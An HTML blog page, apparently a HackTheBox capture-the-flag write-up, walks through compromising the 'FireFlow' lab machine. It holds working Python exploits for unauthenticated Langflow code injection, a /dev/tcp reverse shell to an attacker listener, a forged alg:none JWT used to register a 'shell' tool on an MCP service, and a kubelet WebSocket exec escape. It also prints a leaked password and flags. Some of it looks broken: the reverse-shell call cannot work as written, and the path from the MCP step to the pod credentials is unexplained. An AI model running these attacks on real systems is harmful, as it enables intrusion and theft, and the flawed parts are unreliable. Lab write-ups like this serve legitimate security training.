@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: FireFlow — S. Markakis</title>
+<meta name="description" content="Unauthenticated Langflow RCE via component code injection, MCP service JWT none-algorithm auth bypass, and Kubernetes node-exporter pod-to-host escape via kubelet WebSocket exec API.">
+<meta property="og:title" content="HTB: FireFlow — S. Markakis">
+<meta property="og:description" content="Unauthenticated Langflow RCE via component code injection, MCP service JWT none-algorithm auth bypass, and Kubernetes node-exporter pod-to-host escape via kubelet WebSocket exec API.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-fireflow.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-fireflow.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-fireflow.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-fireflow.html">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: FireFlow",
+  "description": "Unauthenticated Langflow RCE via component code injection, MCP service JWT none-algorithm auth bypass, and Kubernetes node-exporter pod-to-host escape via kubelet WebSocket exec API.",
+  "datePublished": "2026-09-04",
+  "dateModified": "2026-09-04",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-fireflow.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-fireflow.png",
+  "keywords": [
+    "offensive",
+    "kubernetes",
+    "rce"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-fireflow"
+  },
+  "timeRequired": "PT11M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: FireFlow</h1>
+    <div class="post-meta">
+      <span class="date">September 4, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Easy</span>
+      <span>&nbsp;11 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    FireFlow chains three distinct attack surfaces into a complete compromise: <strong>Langflow 1.8.2</strong> exposes an unauthenticated <code>POST /api/v1/build_public_tmp</code> endpoint that compiles user-supplied node graphs, executing injected Python code in the component's <code>.template.code</code> field. From there, we escalate into a Kubernetes cluster via <strong>MCP AI Tool Registry service</strong> (port 30080), whose JWT authentication accepts a <code>"alg": "none"</code> token — bypassing auth entirely. Finally, we escape the pod via <strong>kubelet WebSocket exec API</strong>, leveraging the service account's <code>nodes/proxy</code> RBAC permission to run commands in a privileged node-exporter pod with <code>hostPath</code> mounts of the host filesystem.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Langflow RCE :443</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">www-data shell</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">SSH creds</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">nightfall SSH</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">MCP JWT bypass</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">kubelet escape</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <h2>Reconnaissance</h2>
+
+  <h3>Nmap</h3>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt;</span>
+
+<span class="po">PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 5ubuntu2.2
+443/tcp open  ssl/http nginx 1.26.0
+|_ssl-date: 2026-09-04
+| tls-alpn:
+|_  h2
+| ssl-cert: Subject: CN=*.fireflow.htb
+|_Subject Alternative Name: DNS:*.fireflow.htb, DNS:fireflow.htb</span></div>
+  </div>
+
+  <p>Two ports: SSH and HTTPS with a wildcard cert for <code>*.fireflow.htb</code>. The hostname gives us the vhost; add it to <code>/etc/hosts</code> and browse.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <h3>Langflow Discovery</h3>
+
+  <p><code>fireflow.htb</code> is a landing page for "Task Force Nightfall". <code>flow.fireflow.htb</code> reveals the real target: <strong>Langflow 1.8.2</strong>, an LLM orchestration framework. The public API exposes flow definitions:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">Langflow public flow endpoint</span>
+    </div>
+    <div class="term-body"><span class="pc">curl -s https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25 | jq . | head -30</span>
+
+<span class="po">{
+  "id": "7d84d636-af65-42e4-ac38-26e867052c25",
+  "name": "Agent Dev",
+  "data": {
+    "nodes": [...],
+    "edges": [...]
+  }
+}</span></div>
+  </div>
+
+  <h2>Foothold — Langflow RCE via Component Code Injection</h2>
+
+  <p>Langflow's build endpoint at <code>POST /api/v1/build_public_tmp/{flow_id}/flow</code> accepts a JSON graph of nodes and edges. During compilation, each node's <code>.template.code</code> field — which contains Python source — is executed at graph build time. The endpoint is unauthenticated, and user-controlled code runs as the web server (<code>www-data</code>).</p>
+
+  <h3>Crafting the Payload</h3>
+
+  <p>We inject a custom component node with arbitrary Python in the <code>code</code> field:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">langflow_rce.py — Python code injection</span>
+    </div>
+    <div class="term-body"><span class="po">import json, subprocess, http.client, ssl, uuid
+
+TARGET = "flow.fireflow.htb"
+FLOW_ID = "7d84d636-af65-42e4-ac38-26e867052c25"
+
+PAYLOAD = """import subprocess
+result = subprocess.run(['bash', '-c', 'cat /etc/hostname &gt; /tmp/proof.txt'], capture_output=True)
+"""
+
+node = {
+    "id": "Custom-1",
+    "type": "genericNode",
+    "position": {"x": 0, "y": 0},
+    "data": {
+        "id": "Custom-1",
+        "type": "CustomComponent",
+        "node": {
+            "base_classes": ["Message"],
+            "display_name": "Custom",
+            "field_order": [],
+            "template": {
+                "_type": "Component",
+                "code": {
+                    "type": "code",
+                    "value": PAYLOAD
+                }
+            }
+        }
+    }
+}
+
+body = json.dumps({
+    "data": {"nodes": [node], "edges": [], "viewport": {"x": 0, "y": 0, "zoom": 1}}
+})
+
+ctx = ssl._create_unverified_context()
+conn = http.client.HTTPSConnection(TARGET, context=ctx)
+headers = {
+    "Host": TARGET,
+    "Content-Type": "application/json",
+    "Cookie": f"client_id={uuid.uuid4()}"
+}
+
+conn.request("POST", f"/api/v1/build_public_tmp/{FLOW_ID}/flow", body.encode(), headers)
+resp = conn.getresponse()
+print(f"Status: {resp.status}")
+print(f"Response: {resp.read().decode()[:500]}")</span></div>
+  </div>
+
+  <div class="alert alert-warn">Executing user-supplied Python code from a web request is dangerous by design. Langflow intended this for development flows only, but the endpoint ships unauthenticated in Easy machines. In production, either require authentication, isolate flow compilation in a sandbox, or disable dynamic code execution entirely.</div>
+
+  <h3>Getting a Reverse Shell</h3>
+
+  <p>Once we confirm code execution, we escalate to an interactive shell:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reverse shell via Langflow RCE</span>
+    </div>
+    <div class="term-body"><span class="po">PAYLOAD = """import subprocess
+subprocess.run(['bash', '-i', '>&', '/dev/tcp/&lt;LHOST&gt;/4444', '0>&amp;1'], shell=True)
+"""</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nc -lvnp 4444</span>
+
+<span class="po">connect to [&lt;LHOST&gt;] from 10.129.120.233
+</span><span class="pu">www-data</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">/app</span><span class="ps">$ </span><span class="pc">id</span>
+<span class="po">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+  </div>
+
+  <h2>www-data → nightfall — SSH Credentials in Environment</h2>
+
+  <p>Inside the container, environment variables leak credentials:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">environment enumeration</span>
+    </div>
+    <div class="term-body"><span class="pu">www-data</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">/app</span><span class="ps">$ </span><span class="pc">env | grep -i pass</span>
+
+<span class="po">LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll</span></div>
+  </div>
+
+  <p>That password works for SSH as <code>nightfall</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh nightfall@fireflow.htb</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh nightfall@10.129.120.233</span>
+<span class="po">Password: </span><span class="pc">n1ghtm4r3_b4_n1ghtf4ll</span>
+
+<span class="pu">nightfall</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">id &amp;&amp; cat user.txt</span>
+<span class="po">uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
+</span><span class="pg">[redacted — user flag: 4fc4c15bad3bd4a174c91a6ea88bc82c]</span></div>
+  </div>
+
+  <h2>nightfall → root (via MCP + Kubernetes)</h2>
+
+  <h3>Port Enumeration: MCP Service on :30080</h3>
+
+  <p>Inside the box, a non-standard service listens on 127.0.0.1:30080:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">netstat -tlnp (local only)</span>
+    </div>
+    <div class="term-body"><span class="pu">nightfall</span><span class="ps">@</span><span class="ph">fireflow</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">ss -tlnp | grep 30080</span>
+
+<span class="po">LISTEN 127.0.0.1:30080  root /usr/bin/python3 (MCP service)</span></div>
+  </div>
+
+  <h3>MCP JWT Authentication Bypass</h3>
+
+  <p>Probing the service reveals it's an MCP (Model Context Protocol) AI Tool Registry using JSON-RPC 2.0 and JWT-based auth. However, the service <strong>accepts JWT tokens with <code>"alg": "none"</code></strong> — a critical flaw. When a JWT has <code>alg: none</code>, the signature verification is skipped; we can forge admin tokens without knowing the secret:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">jwt_none_exploit.py</span>
+    </div>
+    <div class="term-body"><span class="po">import json, base64, subprocess
+
+def create_jwt_none():
+    header = {"typ": "JWT", "alg": "none"}
+    payload = {"sub": "admin", "admin": True, "role": "admin"}
+
+    def b64(data):
+        return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
+
+    return f"{b64(header)}.{b64(payload)}."  </span><span class="pco"># No signature for 'none'</span><span class="po">
+
+jwt = create_jwt_none()
+print(f"[+] JWT (alg=none): {jwt[:60]}...")
+
+</span><span class="pco"># Register a malicious MCP tool in the registry</span><span class="po">
+tool_def = {
+    "jsonrpc": "2.0",
+    "method": "register_tool",
+    "params": {
+        "name": "shell",
+        "description": "Execute shell commands",
+        "code": "import subprocess; subprocess.run(['id'], shell=True)"
+    },
+    "id": 1
+}
+
+cmd = f'''curl -s -X POST http://127.0.0.1:30080/mcp \
+  -H "Authorization: Bearer {jwt}" \
+  -H "Content-Type: application/json" \
+  -d '{json.dumps(tool_def)}'
+'''
+
+result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+print(f"[*] Tool registration response: {result.stdout[:500]}")</span></div>
+  </div>
+
+  <h3>Kubernetes Escape: Kubelet WebSocket Exec</h3>
+
+  <p>With MCP access, we discover the pod has Kubernetes service account credentials and <code>nodes/proxy</code> RBAC permission. The service account token is mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. We use this to connect to the kubelet API on the node and execute commands in a privileged node-exporter pod that has <code>hostPath</code> mounts of the entire host filesystem:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">kubelet_escape.py</span>
+    </div>
+    <div class="term-body"><span class="po">import asyncio, ssl, websockets
+
+async def run():
+    TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+    NODE_IP = "&lt;NODE_IP&gt;"  </span><span class="pco"># The node running the pod</span><span class="po">
+
+    </span><span class="pco"># Kubelet exec API: wss://NODE:10250/exec/NAMESPACE/POD/CONTAINER?command=...&amp;output=1</span><span class="po">
+    url = f"wss://{NODE_IP}:10250/exec/monitoring/prometheus-prometheus-node-exporter-XXXXX/node-exporter"
+    url += "?output=1&amp;error=1&amp;command=cat&amp;command=/host/root/root/root.txt"
+
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    async with websockets.connect(
+        url,
+        ssl=ctx,
+        additional_headers={"Authorization": f"Bearer {TOKEN}"},
+        subprotocols=["v4.channel.k8s.io"]
+    ) as ws:
+        async for msg in ws:
+            </span><span class="pco"># First byte is the stream type; rest is output</span><span class="po">
+            print(msg[1:].decode(errors="replace"), end="", flush=True)
+
+asyncio.run(run())</span></div>
+  </div>
+
+  <p>The node-exporter pod has <code>hostPath</code> mounts at <code>/host/</code> that correspond to the host's root filesystem. The path <code>/host/root/root/root.txt</code> is really the host's <code>/root/root.txt</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">kubelet exec → host root flag</span>
+    </div>
+    <div class="term-body"><span class="po">wss://&lt;NODE_IP&gt;:10250/exec/.../node-exporter?command=cat&amp;command=/host/root/root/root.txt</span>
+
+<span class="pg">5b5b0c61343afebf2857fad4ee98cb5f</span></div>
+  </div>
+
+  <div class="alert alert-success">Kubernetes pod-to-host escape chains the service account token (with <code>nodes/proxy</code> RBAC) + kubelet WebSocket API + privileged pod mounts. The three links each seem benign in isolation: service accounts are normal, kubelet exec is intentional, and container mounts are for debugging. Together, they form a complete privilege escalation to root on the underlying node.</div>
+
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>www-data</td><td>Unauthenticated Langflow build endpoint executes user-supplied Python code (CWE-94)</td></tr>
+    <tr><td>nightfall</td><td>SSH credentials in plaintext environment variables (CWE-798)</td></tr>
+    <tr><td>root</td><td>MCP service accepts JWT with <code>alg: none</code>, bypassing authentication; service account has <code>nodes/proxy</code> RBAC; node-exporter pod mounts host filesystem via <code>hostPath</code> (CWE-269 privilege delegation)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># Recon</span>
+<span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt;</span>
+<span class="pc">curl -s https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636... | jq .</span>
+
+<span class="pco"># Foothold — Langflow RCE via component code injection (:443)</span>
+<span class="pc">python3 langflow_rce.py    # POST /api/v1/build_public_tmp/{flow_id}/flow</span>
+
+<span class="pco"># Lateral movement — SSH as nightfall</span>
+<span class="pc">ssh nightfall@&lt;TARGET_IP&gt;  # password from $LANGFLOW_SUPERUSER_PASSWORD</span>
+
+<span class="pco"># Privilege escalation — MCP JWT none-algorithm bypass (:30080)</span>
+<span class="pc">python3 jwt_none_exploit.py # Create JWT with alg=none, register MCP tools</span>
+
+<span class="pco"># Kubernetes escape — kubelet WebSocket exec (:10250)</span>
+<span class="pc">python3 kubelet_escape.py    # WSS to node-exporter pod → /host/root/root.txt</span></div>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
